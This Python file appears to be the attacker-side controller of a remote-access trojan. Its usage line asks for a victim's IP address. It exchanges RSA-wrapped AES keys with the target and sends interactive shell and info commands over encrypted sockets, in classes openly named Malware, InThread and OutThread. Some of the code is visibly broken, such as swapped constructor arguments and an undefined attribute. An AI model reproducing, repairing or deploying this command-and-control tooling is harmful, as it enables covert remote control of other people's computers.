import threading
import time
import socket
import sys
import string
import random
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

remote_public_key = None
public_key_pem = None
private_key = None

IN_PORT = 44444
OUT_PORT = 44455


def print_help():
    print('Couldn\'t load program with arguments', ' '.join(sys.argv))
    print('Usage : python3 <program_name> <victim_IP_address>')


class AESCipher(object):
    """
        AES module by mnothic (https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
        Modified to use CFB AES encryption as CBC wasn't working on Linux (in the case of big responses from target)
        """
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self.pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        return self.unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def pad(self, mess):
        length = 16 - (len(mess) % 16)
        mess += bytes([length]) * length
        return mess

    def unpad(self, mess):
        return mess[:-mess[-1]]


class InThread(threading.Thread):
    """
    Invoked by Malware Thread
    Receives the target's responses
    """
    def __init__(self, ip, key, aes, in_port=IN_PORT):
        super().__init__()
        self.in_port = in_port
        self.ip = ip
        self.key = key
        self.aes = aes

        try:
            self.socket = socket.socket()
            self.socket.bind(('', self.in_port))
            self.socket.listen(1)
            print('Listening for incoming connections')

            self.conn, self.in_ip = self.socket.accept()
            print('Connection received from {} on port {}'.format(self.in_ip[0], self.in_ip[1]))
            self.init_public_key()
        except socket.timeout:
            print('No response from {}'.format(self.ip))
        else:
            self.start()

    def run(self):
        again = True
        while again:
            msg = self.aes.decrypt(self.conn.recv(32768))
            if msg == 'exit':
                again = False
            else:
                print(self.in_ip[0], '--> ', msg)
        self.stop()

    def stop(self):
        self.socket.close()

        print('Closed socket coming from {}:{}'.format(self.in_ip[0], self.in_ip[1]))

    def init_public_key(self):
        try:
            remote_public_key_pem = self.conn.recv(1024)
            global remote_public_key
            remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
            print('Remote public key successfully loaded')
        except socket.timeout:
            self.init_public_key()
        except ValueError:
            print('Invalid Public Key received')

    def rsa_decrypt(self, ciphertext):
        global private_key
        return private_key.decrypt(ciphertext, padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None))


class OutThread(threading.Thread):
    """
    Invoked by Malware Thread
    Sends commands to the target
    """
    def __init__(self, ip, out_port: int, key, aes):
        super().__init__()
        self.ip = ip
        self.out_port = out_port
        self.key = key
        self.aes = aes

        try:
            self.sock = socket.socket()
            self.sock.connect((self.ip, self.out_port))
            print('Connected to', self.ip)
        except ConnectionError:
            print('Unable to connect to {}'.format(self.ip))

        self.send_public_keys()
        self.start()

    def run(self):
        known_commands = ['exit', 'shell', 'info']
        time.sleep(2)
        self.sendkey()
        again = True
        while again:
            time.sleep(1)
            msg = input('{} > '.format(self.ip))
            if msg == '':
                pass
            elif msg == 'exit':
                again = False
                self.send(msg)
            elif msg == 'shell':
                self.send(msg)
                keepalive = True
                while keepalive:
                    time.sleep(1)
                    shell = input('{} > shell > '.format(self.ip))
                    if shell == '':
                        pass
                    elif shell == 'exit':
                        keepalive = False
                        self.send(shell)
                    else:
                        self.send(shell)
            elif msg[:4] == 'info':
                self.send(msg)
            else:
                print('List of known functions : ', ' '.join(known_commands))

        time.sleep(2)
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()
        print('Terminated connection to {}'.format(self.ip))

    def send(self, message):
        try:
            self.sock.sendall(self.aes.encrypt(message.encode('UTF-8')))
        except ConnectionError:
            print('Unable to send <<{}>> to {}'.format(message, self.ip))

    # Function sends the AES key, encrypted using RSA keys
    def sendkey(self):
        try:
            self.sock.send(self.rsa_encrypt(self.key.encode('UTF-8')))
        except ConnectionError:
            print('Unable to send session key')

    def send_public_keys(self):
        try:
            global public_key_pem
            self.sock.sendall(public_key_pem)
        except ConnectionError:
            print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
            self.send_public_keys()

    def rsa_encrypt(self, message):
        global remote_public_key
        return remote_public_key.encrypt(message, padding.OAEP(
                                             mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                             algorithm=hashes.SHA256(),
                                             label=None))


class Malware():
    """
    Main Thread : invokes IN & OUT Threads
    Generates RSA & AES keys
    """
    def __init__(self, ip, out_port=OUT_PORT, in_port=IN_PORT):
        self.ip = ip
        self.out_port = out_port
        self.in_port = in_port

        print("Trying to reach {} on port {}".format(self.ip, self.out_port))

        global private_key
        global public_key_pem
        private_key = self.generate_rsa_keys()
        public_key_pem = self.serialize_public_key(private_key.public_key())

        aeskey = (''.join([random.choice(string.ascii_letters + string.digits) for n in range(32)]))
        aes = AESCipher(aeskey)

        self.cons = OutThread(self.ip, self.out_port, aeskey, aes)
        self.prod = InThread(self.in_port, aeskey, aes)

    def run(self):
        self.prod.start()
        self.cons.start()
        if self.cons.is_alive():
            self.cons.join()
        if self.prod.is_alive():
            self.prod.stop()

        self.stop()

    def stop(self):
        self.prod.stop()
        self.cons.stop()

    def generate_rsa_keys(self):
        return rsa.generate_private_key(backend=default_backend(),
                                        public_exponent=65537,
                                        key_size=2048)

    def serialize_public_key(self,public_key):
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)


"""
Checks if argument is valid then Invokes Malware Thread
"""
if len(sys.argv) == 2:
    ip = sys.argv[1]
    try:
        socket.inet_aton(ip)
    except socket.error:
        print('Invalid IP address. Please try again')
        print_help()
    else:
        malw = Malware(ip)

else:
    print_help()
